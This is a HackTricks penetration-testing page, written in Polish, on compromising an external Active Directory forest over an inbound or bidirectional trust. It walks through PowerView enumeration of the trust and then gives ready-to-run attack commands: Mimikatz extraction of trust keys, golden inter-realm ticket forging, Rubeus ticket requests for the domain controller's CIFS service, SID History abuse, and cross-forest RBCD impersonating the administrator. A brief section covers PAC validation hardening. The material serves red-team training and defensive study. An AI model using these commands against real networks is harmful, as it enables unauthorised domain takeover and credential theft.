# Zewnętrzna domena lasu - OneWay (Inbound) lub dwukierunkowa

{{#include ../../banners/hacktricks-training.md}}

W tym scenariuszu zewnętrzna domena Ci ufa (lub obie ufają sobie nawzajem), więc możesz uzyskać pewien rodzaj dostępu do niej.

## Enumeracja

Przede wszystkim musisz **wyenumerować** **zaufanie**:
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.

# Additional trust hygiene checks (AD RSAT / AD module)
Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
```
> `SelectiveAuthentication`/`SIDFiltering*` pozwalają szybko sprawdzić, czy międzylasowe ścieżki nadużyć (RBCD, SIDHistory) prawdopodobnie będą działać bez dodatkowych wymagań.

W poprzedniej enumeracji stwierdzono, że użytkownik **`crossuser`** należy do grupy **`External Admins`**, która ma **Admin access** w **DC zewnętrznej domeny**.

## Początkowy dostęp

Jeśli **nie udało Ci się** znaleźć żadnych **specjalnych** uprawnień Twojego użytkownika w drugiej domenie, możesz wrócić do metodologii AD i spróbować **privesc from an unprivileged user** (rzeczy takie jak kerberoasting na przykład):

Możesz użyć **funkcji Powerview** aby **wyenumerować** **drugą domenę** używając parametru `-Domain` jak w:
```bash
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{{#ref}}
./
{{#endref}}

## Impersonation

### Logging in

Używając standardowej metody z poświadczeniami użytkowników, którzy mają dostęp do zewnętrznej domeny, powinieneś być w stanie uzyskać dostęp do:
```bash
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### Nadużycie SID History

Możesz również wykorzystać [**SID History**](sid-history-injection.md) w zaufaniu między lasami.

Jeśli użytkownik zostanie zmigrowany **z jednego lasu do drugiego** i **SID Filtering is not enabled**, staje się możliwe **dodanie SID z drugiego lasu**, a ten **SID** zostanie **dodany** do **tokenu użytkownika** podczas uwierzytelniania **w ramach zaufania**.

> [!WARNING]
> Dla przypomnienia: możesz uzyskać klucz podpisujący za pomocą
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
> ```

Możesz **podpisać** **zaufanym** kluczem **TGT impersonating** użytkownika bieżącej domeny.
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Pełna metoda podszywania się pod użytkownika
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Cross-forest RBCD gdy kontrolujesz konto komputera w trusting forest (no SID filtering / selective auth)

Jeśli twój foreign principal (FSP) zostanie umieszczony w grupie, która może zapisywać obiekty komputerowe w trusting forest (np. `Account Operators`, custom provisioning group), możesz skonfigurować **Resource-Based Constrained Delegation** na docelowym hoście w tym lesie i podszyć się tam pod dowolnego użytkownika:
```bash
# 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
# 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
Set-ADComputer -Identity victim-host$ -PrincipalsAllowedToDelegateToAccount MYLAB$
# or with PowerView
Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sidbytes_of_MYLAB}

# 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
```
To działa tylko wtedy, gdy **SelectiveAuthentication is disabled** i **SID filtering** nie usuwa kontrolującego SID. Jest to szybka lateral path, która omija SIDHistory forging i jest często pomijana podczas przeglądów zaufania.

### Wzmacnianie walidacji PAC

Aktualizacje walidacji podpisu PAC dla **CVE-2024-26248**/**CVE-2024-29056** wprowadzają wymuszanie podpisu dla inter-forest tickets. W **Compatibility mode** sfałszowane inter-realm PAC/SIDHistory/S4U ścieżki wciąż mogą działać na niezałatanych DCs. W **Enforcement mode** niepodpisane lub zmodyfikowane dane PAC przekraczające forest trust są odrzucane, chyba że posiadasz także klucz trustu docelowego lasu. Nadpisania rejestru (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) mogą to osłabić, dopóki pozostają dostępne.



## References

- [Microsoft KB5037754 – PAC validation changes for CVE-2024-26248 & CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
- [MS-PAC spec – SID filtering & claims transformation details](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
{{#include ../../banners/hacktricks-training.md}}
